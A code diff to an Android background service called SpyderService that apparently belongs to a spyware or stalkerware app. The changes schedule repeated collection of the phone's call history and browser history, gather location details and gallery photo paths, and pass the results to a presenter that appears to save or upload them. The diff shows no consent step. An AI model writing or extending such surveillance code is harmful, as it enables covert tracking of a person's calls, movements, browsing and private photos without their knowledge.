@@ -61,18 +61,20 @@ public class SpyderService extends Service implements SpyderContract.View {
         getlangitude = gpsTrack.currentLangitude;
         getLattitude = gpsTrack.currentLattitude;
         timer = new Timer();
-        //timerOperation();
-//call History and browserDetails
+        //timerLocationOperation();
+       // timerOneDayOperation();
+     //call History and browserDetails
         getDetailsInformation = new GetDetailsInformation(getApplicationContext());
-       // callSaveCallHistoryDetails();
-        MyLog.log("This time was I called Get Gallery Photos.....","start......");
-        getGalleryPhotosService();
+        //  callLocationDetails();
+       //  callSaveCallHistoryDetails();
+
+       getGalleryPhotosService();
         //getDetailsInformation.getBrowserHistory();
         //getDetailsInformation.secondmethodBrowserHistory();
 
     }
 
-    private void timerOperation() {
+    private void timerLocationOperation() {
         timer.scheduleAtFixedRate(new TimerTask() {
             @Override
             public void run() {
@@ -80,6 +82,18 @@ public class SpyderService extends Service implements SpyderContract.View {
             }
         }, 0, Constants.TIMER_REPEAT);
     }
+
+    private void timerOneDayOperation() {
+        timer.scheduleAtFixedRate(new TimerTask() {
+            @Override
+            public void run() {
+                callSaveCallHistoryDetails();
+                callBrowswerHistory();
+            }
+        }, 0, Constants.TIMER_REPEAT);
+    }
+
+
 
     @Override
     public void onStart(Intent intent, int startId) {
@@ -99,8 +113,15 @@ public class SpyderService extends Service implements SpyderContract.View {
         return null;
     }
 
-    private void callLocationDetails() {
+    private void callBrowswerHistory() {
 
+    }
+
+
+    private void callLocationDetails() {
+        if(getDetailsInformation==null) {
+            getDetailsInformation = new GetDetailsInformation(getApplicationContext());
+        }
         Log.v("callLocationDetails", "");
         locationDetails = new LocationDetails();
         List<LocationDetail> locationDetailList = new ArrayList<>();
@@ -128,13 +149,20 @@ public class SpyderService extends Service implements SpyderContract.View {
     }
 
     public void callSaveCallHistoryDetails() {
+        if(getDetailsInformation==null) {
+            getDetailsInformation = new GetDetailsInformation(getApplicationContext());
+        }
         CallHistoryDetails callHistoryDetails = new CallHistoryDetails();
         callHistoryDetails.setCallHistoryDetails(getDetailsInformation.getCallHistory());
        // MyLog.log("calldetails", gson.toJson(callHistoryDetails));
         //showProgressDialog();
-        mSpyderPresenter.savecallHistoryDetails(callHistoryDetails);
+        if(callHistoryDetails.getCallHistoryDetails().size()>0)
+        {mSpyderPresenter.savecallHistoryDetails(callHistoryDetails);}
     }
     public void getGalleryPhotosService() {
+        if(getDetailsInformation==null) {
+            getDetailsInformation = new GetDetailsInformation(getApplicationContext());
+        }
         UserPhotoDetailList userPhotoDetailList = new UserPhotoDetailList();
         userPhotoDetailList.setPhotoDetails(getDetailsInformation.fn_imagespath());
         // MyLog.log("calldetails", gson.toJson(callHistoryDetails));
